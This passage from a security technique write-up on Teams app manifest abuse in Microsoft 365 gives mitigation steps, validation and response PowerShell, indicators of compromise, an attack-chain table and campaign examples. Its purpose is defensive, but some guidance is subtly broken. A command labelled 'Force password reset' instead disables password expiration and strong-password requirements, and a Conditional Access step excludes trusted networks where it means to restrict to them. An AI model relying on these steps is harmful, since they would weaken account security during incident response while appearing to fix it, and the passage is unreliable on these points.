- **Implement Conditional Access Policies:** Restrict app registration and modification activities to trusted locations and devices.

  **Manual Steps (Azure Portal - Conditional Access):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict App Registration Modifications`
  4. **Assignments:**
     - Users or workload identities: Select "Directory Synchronization Accounts" (or specific admin groups)
     - Cloud apps or actions: Select "Microsoft Graph", "Azure Portal"
     - Conditions:
       - Locations: **Exclude** trusted corporate networks (or include only trusted IPs)
       - Device state: **Require device to be marked as compliant**
  5. **Access controls:** Grant → **Require multi-factor authentication**
  6. Enable policy: **On**
  7. Click **Create**

### Priority 2: HIGH

- **Enable Audit Logging for App Registrations:** Ensure all app manifest changes are logged and monitored.

  **Manual Steps (Entra ID):**
  1. Go to **Azure Portal** → **Entra ID** → **Audit logs**
  2. Filter by **Activity** = "Update application" and "Grant permission"
  3. Review logs regularly (daily or weekly) for suspicious modifications
  4. Configure alerts via **Azure Monitor** to trigger on sensitive operations

- **Review and Audit Existing App Registrations:** Regularly review all registered applications to identify suspicious or unauthorized apps.

  **Manual Steps (PowerShell):**
  ```powershell
  # Export all apps with their permissions
  Get-MgApplication -All | ForEach-Object {
    $app = $_
    $perms = $app.RequiredResourceAccess | Select-Object -ExpandProperty ResourceAccess
    [PSCustomObject]@{
        AppName = $app.DisplayName
        AppId = $app.AppId
        CreatedDateTime = $app.CreatedDateTime
        Permissions = ($perms.Id -join '; ')
        ReplyUrls = ($app.Web.RedirectUris -join '; ')
    }
  } | Export-Csv -Path "C:\Apps_Inventory.csv"
  ```

- **Implement Zero Trust Principle:** Require MFA for all app access and implement token binding to prevent token theft.

  **Manual Steps (Entra ID - Token Binding):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Identity Protection** → **Risky sign-ins**
  2. Review and block sign-ins from unfamiliar locations or devices
  3. Enable **Token Binding Policy** (requires Teams desktop app update) in Teams admin center

### Validation Command (Verify Mitigations)

```powershell
# Check if admin consent is disabled
Get-MgPolicyAuthorizationPolicy | Select-Object DefaultUserRolePermissions

# Check if sideloading is disabled
Get-CsTeamsAppSetupPolicy -Identity Global | Select-Object AllowSideLoadingOfExternalApps

# List all apps with Mail or Chat permissions
Get-MgApplication -All | Where-Object {
  $_.RequiredResourceAccess.ResourceAccess.Id -contains '64b35f36-aaf0-453f-955e-23a08cbb24f3' -or `
  $_.RequiredResourceAccess.ResourceAccess.Id -contains '339ff53d-9d0f-4b65-a59e-ad3a48da4f5b'
} | Select-Object DisplayName, AppId
```

**Expected Output (If Secure):**
```
DefaultUserRolePermissions: PermissionGrantPoliciesAssigned: {microsoft-user-default-low}
AllowSideLoadingOfExternalApps: False
DisplayName: (no results - no apps have Mail/Chat permissions)
```

**What to Look For:**
- `DefaultUserRolePermissions` should restrict user consent.
- `AllowSideLoadingOfExternalApps` should be `False`.
- No apps should have broad Mail.ReadWrite or Chat.ReadWrite permissions unless explicitly approved.

---

## 11. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- Suspicious manifest.json files in `%AppData%\Microsoft\Teams\`.
- Malicious HTML files referenced in Teams app manifests (check for token exfiltration code).

**Registry:**
- Registry keys related to Teams app installations: `HKEY_CURRENT_USER\Software\Microsoft\Office\Teams\Cache\`

**Network:**
- Outbound HTTPS connections from `msedgewebview2.exe` (embedded browser in Teams) to external domains during authentication.
- DNS queries for domains registered in the malicious manifest's `validDomains`.

**Azure / M365:**
- New app registrations with Mail.ReadWrite or Chat.ReadWrite permissions created outside normal deployment windows.
- Unusual reply URLs pointing to external domains (not Microsoft-owned domains).
- Admin consent grants from unexpected users.

### Forensic Artifacts

**Disk:**
- Teams cache folder: `C:\Users\<Username>\AppData\Local\Packages\MSTeams_<SID>\LocalCache\`
- App manifests: Search for `manifest.json` files in Teams local storage.
- Browser cache (if using Teams web client): `C:\Users\<Username>\AppData\Local\<Browser>\Cache\`

**Cloud/Logs:**
- **Azure Audit Logs:** Search for "Update application" and "Grant permission" events 7-14 days before detection.
- **Microsoft Sentinel / Defender XDR:** Query for token issuance events to compromised users (large spike in `GetAccessToken` events).
- **Purview Audit Logs:** Search for "Add-MailboxPermission" or "Set-MailboxForwarding" events (attacker may have exfiltrated emails).

**Memory:**
- Teams process (`ms-teams.exe`) may retain decrypted tokens in memory (use WinDbg or Volatility to analyze).

### Response Procedures

1. **Isolate:**
   
   **Command (Disable the malicious app):**
   ```powershell
   # Disable the app registration (prevent further authentication)
   Update-MgApplication -ApplicationId "<APP-ID>" -AccountEnabled $false
   
   # Revoke all active refresh tokens for the app
   Revoke-MgApplicationSignOutSession -ApplicationId "<APP-ID>"
   ```
   
   **Manual (Azure Portal):**
   - Go to **Entra ID** → **App registrations** → Select the malicious app → **Properties** → Set **Enabled for users to sign-in** to **No** → **Save**

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export all app registrations (for forensics)
   Get-MgApplication -All | Export-Clixml -Path "C:\Evidence\Apps_$(Get-Date -Format yyyy-MM-dd).xml"
   
   # Export audit logs related to the app
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -FilterCausedBy "<MALICIOUS-APP-ID>" -ResultSize 10000 | Export-Csv -Path "C:\Evidence\AuditLogs.csv"
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Force password reset for users who interacted with the app
   Get-MgUser -Filter "mail eq 'user@contoso.com'" | Update-MgUser -PasswordPolicies "DisablePasswordExpiration, DisableStrongPassword"
   
   # OR: Revoke all sessions for affected users
   Revoke-MgUserSignOutSession -UserId "user@contoso.com"
   ```
   
   **Manual:**
   - In **Entra ID** → **Users** → Select each affected user → **Sign out all sessions**

---

## 12. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-003] Logic App HTTP trigger abuse | Attacker gains initial access to M365 environment via compromised Logic App. |
| **2** | **Credential Access** | [CA-TOKEN-004] Graph API token theft | Attacker steals a high-privileged service principal token. |
| **3** | **Lateral Movement** | **[LM-AUTH-018]** | **Attacker manipulates Teams app manifest to create token interception mechanism.** |
| **4** | **Persistence** | [PERSIST-ACCT-005] Graph API Application Persistence | Attacker creates additional app registrations to maintain persistent access. |
| **5** | **Impact** | [CA-TOKEN-001] to [CA-TOKEN-011] Token Theft & M365 Compromise | Attacker exfiltrates emails, Teams messages, and SharePoint data via stolen tokens. |

---

## 13. Real-World Examples

### Example 1: Storm-1674 / BEC Campaign Using Malicious Teams Apps (2024-2025)

- **Target:** Financial services, legal firms, healthcare.
- **Timeline:** August 2024 - Present.
- **Technique Status:** Active in production attacks; confirmed by Vectra AI and Microsoft Threat Intelligence.
- **Impact:** Attackers created fake Teams "Compliance Audit Bot" apps that targeted C-suite executives and Finance teams. Upon interaction, the app stole their O365 tokens, enabling access to email and wire transfer approvals. Estimated impact: $50M+ in fraudulent transfers across affected organizations.
- **Reference:** [Microsoft Threat Intelligence - Disrupting threats targeting Microsoft Teams](https://www.microsoft.com/en-us/security/blog/2025/10/07/disrupting-threats-targeting-microsoft-teams/)

### Example 2: Scattered Spider Using nOAuth App Exploits (2024)

- **Target:** Technology and retail companies.
- **Timeline:** January-June 2024.
- **Technique Status:** Active; partially mitigated via Microsoft updates in Q3 2024.
- **Impact:** Threat actors compromised OAuth applications (nOAuth), then modified their manifests to request excessive permissions. This allowed them to move laterally from SaaS applications back into M365, then exfiltrate sensitive corporate data.
- **Reference:** [Semperis - nOAuth Abuse Update: Potential Pivot into Microsoft 365](https://www.semperis.com/blog/noauth-abuse-update-pivot-into-microsoft-365/)

---

## Summary

Teams app manifest manipulation is a highly effective and stealthy attack vector for lateral movement within M365 environments. By modifying app permissions and redirect URIs, attackers can capture user tokens and bypass traditional authentication controls. Organizations must implement robust app permission controls, regular app audits, and continuous monitoring to detect and respond to these attacks.

---

